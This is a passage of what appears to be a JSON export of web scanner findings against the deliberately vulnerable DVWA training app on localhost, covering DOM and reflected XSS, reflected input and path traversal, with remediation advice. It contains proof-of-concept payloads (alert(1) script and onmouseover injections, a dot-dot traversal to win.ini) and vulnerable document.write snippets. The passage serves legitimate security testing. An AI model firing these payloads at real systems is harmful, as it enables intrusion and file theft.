        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n\t<li><a href=\"https://capec.mitre.org/data/definitions/588.html\">CAPEC-588: DOM-Based XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to DOM-based cross-site scripting. Data is read from <b>document.location.href</b> and passed to <b>document.write()</b>.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "document.location.href",
        "issue__staticAnalysis__sink": "document.write()",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "var lang = document.location.href.substring(document.location.href.indexOf(\"default=\")+8);",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "document.write(\"<option value='\" + lang + \"'>\" + decodeURI(lang) + \"</option>\");",
        "issue__dynamicAnalysis__source": "location.href",
        "issue__dynamicAnalysis__sink": "document.write",
        "issue__dynamicAnalysis__sourceStackTrace": "at Object._0x33d7c2 [as proxiedGetterCallback] (<anonymous>:1:588475)\\nat Object.get href [as href] (<anonymous>:1:298487)\\nat https://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English:69:36",
        "issue__dynamicAnalysis__sinkStackTrace": "at Object.Lixzr (<anonymous>:1:175099)\\nat Object.jNwri (<anonymous>:1:573993)\\nat _0x5d9df9 (<anonymous>:1:590480)\\nat Object.GvThk (<anonymous>:1:172421)\\nat Object.mHBUy (<anonymous>:1:493848)\\nat Object.SPRUB (<anonymous>:1:507129)\\nat Object.yRKLW (<anonymous>:1:508761)\\nat HTMLDocument.write (<anonymous>:1:509996)\\nat https://localhost:8888/dvwa/vulnerabilities/xss_d/?default=English:70:16",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "?default=ozp85p80qf%27%22`'\"/ozp85p80qf/><ozp85p80qf/\\>lgqkya4qci&English",
        "issue__dynamicAnalysis__sinkValue": "<option value='ozp85p80qf%27%22`'\"/ozp85p80qf/><ozp85p80qf/\\>lgqkya4qci&English'>ozp85p80qf'\"`'\"/ozp85p80qf/><ozp85p80qf/\\>lgqkya4qci&English</option>",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "https://localhost:8888/dvwa/vulnerabilities/xss_d/?default='\"/onmouseover=alert(1)//English",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "FALSE",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "95": {
        "\ufeffissue__serialNumber": "8.70636E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/phpinfo.php",
        "issue__location": "/dvwa/phpinfo.php [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "96": {
        "\ufeffissue__serialNumber": "4.74181E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>rqoqw'&gt;&lt;script&gt;alert(1)&lt;/script&gt;v7ueh</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "97": {
        "\ufeffissue__serialNumber": "5.62565E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/ [security cookie]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "98": {
        "\ufeffissue__serialNumber": "4.98854E+18",
        "issue__type": "1049344",
        "issue__name": "File path traversal",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/fi/",
        "issue__location": "/dvwa/vulnerabilities/fi/ [page parameter]",
        "issue__severity": "High",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>File path traversal vulnerabilities arise when user-controllable data is used within a filesystem operation in an unsafe manner. Typically, a user-supplied filename is appended to a directory prefix in order to read or write the contents of a file. If vulnerable, an attacker can supply path traversal sequences (using dot-dot-slash characters) to break out of the intended directory and read or write files elsewhere on the filesystem.</p>\\n<p>This is typically a very serious vulnerability, enabling an attacker to access sensitive files containing configuration data, passwords, database records, log data, source code, and program scripts and binaries. </p>",
        "issue__remediationBackground": "<p>Ideally, application functionality should be designed in such a way that user-controllable data does not need to be passed to filesystem operations. This can normally be achieved by referencing known files via an index number rather than their name, and using application-generated filenames to save user-supplied file content.</p>\\n<p>If it is considered unavoidable to pass user-controllable data to a filesystem operation, three layers of defense can be employed to prevent path traversal attacks: </p>\\n<ul><li>User-controllable data should be strictly validated before being passed to any filesystem operation. In particular, input containing dot-dot sequences should be blocked.</li><li>After validating user input, the application can use a suitable filesystem API to verify that the file to be accessed is actually located within the base directory used by the application. In Java, this can be achieved by instantiating a java.io.File object using the user-supplied filename and then calling the getCanonicalPath method on this object. If the string returned by this method does not begin with the name of the start directory, then the user has somehow bypassed the application's input filters, and the request should be rejected. In ASP.NET, the same check can be performed by passing the user-supplied filename to the System.Io.Path.GetFullPath method and checking the returned string in the same way as described for Java.</li><li>The directory used to store files that are accessed using user-controllable data can be located on a separate logical volume to other sensitive application and operating system files, so that these cannot be reached via path traversal attacks. In Unix-based systems, this can be achieved using a chrooted filesystem; on Windows, this can be achieved by mounting the base directory as a new logical drive and using the associated drive letter to access its contents.</li></ul>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/file-path-traversal\">Web Security Academy: Directory traversal</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/22.html\">CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/23.html\">CWE-23: Relative Path Traversal</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/35.html\">CWE-35: Path Traversal: '.../...//'</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/36.html\">CWE-36: Absolute Path Traversal</a></li>\\n\t<li><a href=\"https://capec.mitre.org/data/definitions/126.html\">CAPEC-126: Path Traversal</a></li>\\n</ul>",
        "issue__issueDetail": "The <b>page</b> parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.<br><br>The payload <b>..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini</b> was submitted in the page parameter. The requested file was returned in the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "99": {
        "\ufeffissue__serialNumber": "7.6424E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/weak_id/",
        "issue__location": "/dvwa/vulnerabilities/weak_id/ [security cookie]",
        "issue__severity": "Medium",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>ialuw'&gt;&lt;script&gt;alert(1)&lt;/script&gt;uj7jvbpu9x3</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.<br><br>The original request used a Content-type header which it is not possible to generate using a standard HTML form. It was possible to replace this header with a standard value, to facilitate cross-domain delivery of an exploit.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
